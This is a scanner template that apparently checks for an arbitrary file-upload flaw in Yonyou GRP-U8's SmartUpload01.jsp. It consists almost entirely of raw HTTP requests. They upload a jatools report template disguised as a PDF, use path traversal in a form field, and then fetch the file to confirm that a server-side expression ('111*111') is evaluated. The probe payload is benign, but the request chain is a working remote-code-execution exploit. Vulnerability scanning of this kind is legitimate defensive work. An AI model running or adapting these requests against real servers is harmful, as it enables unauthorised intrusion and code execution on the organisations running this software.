id: yongyou-grp-u8-SmartUpload01-fileupload

info:
  name: yongyou-grp-u8-SmartUpload01-fileupload
  author: yongyou-grp-u8-SmartUpload01-fileupload

variables:
  filename: "{{to_lower(rand_base(10))}}"
  boundary: "{{to_lower(rand_base(20))}}"

http:
  - raw:
      - |
        POST /u8qx/SmartUpload01.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
        Connection: close
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Encoding: gzip, deflate, br, zstd
        Content-Type: multipart/form-data; boundary={{boundary}}

        --{{boundary}}
        Content-Disposition: form-data; name="uname"

        ../../../../../../../../../{{filename}}
        --{{boundary}}
        Content-Disposition: form-data; name="input_localfile"; filename="{{filename}}.pdf"

        <jatools Class="jatools.ReportDocument" Name="jatools report template">
        <VariableContext>
        </VariableContext>
        <Page>
        <Name>panel</Name>
        <Children ItemClass="PagePanel">
        <Item0>
        <Name>header</Name>
        <Width>753</Width>
        <Height>80</Height>
        <Children ItemClass="Label">
        <Item0>
        <Text>用一个Student对象,和其getMembers()方法,作成一个嵌套的表格dlvmwt</Text>
        <ForeColor>-65536</ForeColor>
        <X>41</X>
        <Y>15</Y>
        <Width>362</Width>
        <Height>62</Height>
        </Item0>
        </Children>
        <Type>100</Type>
        </Item0>
        <Item1>
        <Name>footer</Name>
        <Y>802</Y>
        <Width>753</Width>
        <Height>280</Height>
        <Type>103</Type>
        </Item1>
        <Item2>
        <Name>body</Name>
        <Y>80</Y>
        <Width>753</Width>
        <Height>722</Height>
        <Children ItemClass="Table">
        <Item0>
        <NodePath>学生表</NodePath>
        <X>115</X>
        <Y>77</Y>
        <Children>
        <Item0 Class="Label">
        <Text>家庭成员</Text>
        <Border/>
        <PrintStyle>united-level:1;</PrintStyle>
        <Cell>
        <Row>3</Row>
        <Col>0</Col>
        <RowSpan>2</RowSpan>
        </Cell>
        </Item0>
        <Item1 Class="Label">
        <Text>关系</Text>
        <BackColor>-4144897</BackColor>
        <Border/>
        <Cell>
        <Row>3</Row>
        <Col>1</Col>
        </Cell>
        </Item1>
        <Item2 Class="Label">
        <Text>性别</Text>
        <BackColor>-4144897</BackColor>
        <Border/>
        <Cell>
        <Row>3</Row>
        <Col>2</Col>
        </Cell>
        </Item2>
        <Item3 Class="Label">
        <Text>年龄</Text>
        <BackColor>-4144897</BackColor>
        <Border/>
        <Cell>
        <Row>3</Row>
        <Col>3</Col>
        </Cell>
        </Item3>
        <Item4 Class="Label">
        <Text>得分</Text>
        <Border/>
        <Cell>
        <Row>2</Row>
        <Col>0</Col>
        </Cell>
        </Item4>
        <Item5 Class="Label">
        <Text>性别</Text>
        <Border/>
        <Cell>
        <Row>1</Row>
        <Col>0</Col>
        </Cell>
        </Item5>
        <Item6 Class="Label">
        <Text>姓名</Text>
        <Border/>
        <Cell>
        <Row>0</Row>
        <Col>0</Col>
        </Cell>
        </Item6>
        <Item7 Class="Text">
        <Variable>=$学生表</Variable>
        <Border/>
        <Cell>
        <Row>0</Row>
        <Col>1</Col>
        <ColSpan>3</ColSpan>
        </Cell>
        </Item7>
        <Item8 Class="Text">
        <Variable>=$学生表.value()</Variable>
        <Border/>
        <Cell>
        <Row>1</Row>
        <Col>1</Col>
        <ColSpan>3</ColSpan>
        </Cell>
        </Item8>
        <Item9 Class="Text">
        <Variable>=$学生表.getName()</Variable>
        <Border/>
        <Cell>
        <Row>2</Row>
        <Col>1</Col>
        <ColSpan>3</ColSpan>
        </Cell>
        </Item9>
        <Item10 Class="RowPanel">
        <Cell>
        <Row>4</Row>
        <Col>0</Col>
        <ColSpan>4</ColSpan>
        </Cell>
        <Children ItemClass="Text">
        <Item0>
        <Variable></Variable>
        <Border/>
        <Cell>
        <Row>4</Row>
        <Col>3</Col>
        </Cell>
        </Item0>
        <Item1>
        <Variable></Variable>
        <Border/>
        <Cell>
        <Row>4</Row>
        <Col>2</Col>
        </Cell>
        </Item1>
        <Item2>
        <Variable>;</Variable>
        <Border/>
        <Cell>
        <Row>4</Row>
        <Col>1</Col>
        </Cell>
        </Item2>
        </Children>
        <NodePath>成员</NodePath>
        </Item10>
        </Children>
        <ColumnWidths>60,60,60,60</ColumnWidths>
        <RowHeights>20,20,20,20,20</RowHeights>
        </Item0>
        </Children>
        <Type>102</Type>
        </Item2>
        </Children>
        </Page>
        <NodeSource>
        <Children ItemClass="ArrayNodeSource">
        <Item0>
        <Children ItemClass="ArrayNodeSource">
        <Item0>
        <TagName>成员</TagName>
        <Expression>$.value()</Expression>
        </Item0>
        </Children>
        <TagName>学生表</TagName>
        <Expression>new Object[]{111*111}</Expression>
        </Item0>
        </Children>
        </NodeSource>
        </jatools>
        --{{boundary}}--




      - |
        GET /jatoolsreport?file=/{{filename}}.pdf&as=dhtml HTTP/1.1
        Host: {{Hostname}}
        User-Agent: User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
        Accept: */*
        Accept-Encoding: gzip, deflate, br, zstd
    matchers:
      - type: dsl
        dsl:
          - "contains(body_2, '12321')"

